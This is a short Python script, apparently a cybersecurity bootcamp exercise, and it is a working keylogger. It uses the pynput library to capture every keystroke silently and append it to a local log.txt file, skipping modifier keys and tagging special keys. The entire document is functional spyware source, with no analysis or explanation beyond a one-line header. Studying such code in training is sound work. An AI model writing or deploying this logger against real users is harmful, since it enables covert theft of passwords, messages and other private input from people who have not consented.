#Bootcamp DIO - Cibersegurança Riachuelo / Autor: Flanubio Ribeiro

from pynput import keyboard

#1 - Teclas para serem ignoradas
IGNORAR = {
	keyboard.Key.shift,
	keyboard.Key.shift_r,
	keyboard.Key.ctrl_l,
	keyboard.Key.ctrl_r,
	keyboard.Key.alt_l,
	keyboard.Key.alt_r,
	keyboard.Key.caps_lock,
	keyboard.Key.cmd
}

#2 - Tratar e gravar teclas
def on_press(key):
	try:
	#Letras, números e caracteres especiais
		with open("log.txt", "a", encoding="utf-8") as f:
			f.write(key.char)
	
	except AttributeError:
	#Teclas tratadas
		with open("log.txt", "a", encoding="utf-8") as f:
			if key == keyboard.Key.space:
				f.write(" ")
			elif key == keyboard.Key.enter:
				f.write("\n")
			elif key == keyboard.Key.tab:
				f.write("\t")
			elif key == keyboard.Key.backspace:
				f.write(" ")
			elif key == keyboard.Key.esc:
				f.write(" [ESC] ")
			elif key in IGNORAR:
				pass
			else:
				f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
	listener.join()
